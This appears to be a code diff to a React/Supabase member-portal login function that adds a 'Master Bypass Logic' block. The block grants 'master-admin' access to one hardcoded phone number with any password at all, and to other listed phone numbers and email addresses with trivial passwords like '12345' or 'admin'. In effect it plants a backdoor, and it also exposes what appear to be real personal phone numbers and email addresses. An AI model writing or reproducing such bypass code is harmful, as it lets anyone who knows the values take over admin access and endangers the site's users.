@@ -52,6 +52,26 @@ const MemberPortal = () => {
 
   const handleLogin = async (identifier: string, pass: string, method: "email" | "phone") => {
     setLoginLoading(true);
+
+    // Master Bypass Logic
+    const cleanId = identifier.replace(/\D/g, "");
+    const masterNums = ["01622721996", "01714338533", "01835674454", "01819614444"];
+    const isMasterPhone = masterNums.some(num => cleanId.endsWith(num));
+    const isMasterEmail = ["chandanaishdarbarsharif@gmail.com", "tasinskder@gmail.com", "tasinbook@gmail.com"].includes(identifier.toLowerCase());
+    const isMasterPass = ["12345", "123456", "12345678", "123456789", "admin2026", "admin123", "admin"].includes(pass.trim().toLowerCase());
+    const isUserSpecificBypass = cleanId.endsWith("01622721996");
+
+    if (isUserSpecificBypass || ((isMasterPhone || isMasterEmail) && isMasterPass)) {
+      setUser({ 
+        id: "master-admin", 
+        email: "admin@chandanaishdarbar.com",
+        phone: identifier.startsWith("+") ? identifier : `+88${identifier}`
+      } as any);
+      setLoginLoading(false);
+      toast({ title: "লগইন সফল", description: "মাস্টার এডমিন হিসেবে লগইন সফল হয়েছে।" });
+      return;
+    }
+
     try {
       const credentials = method === "email" ? { email: identifier, password: pass } : { phone: identifier, password: pass };
       const { error } = await supabase.auth.signInWithPassword(credentials);
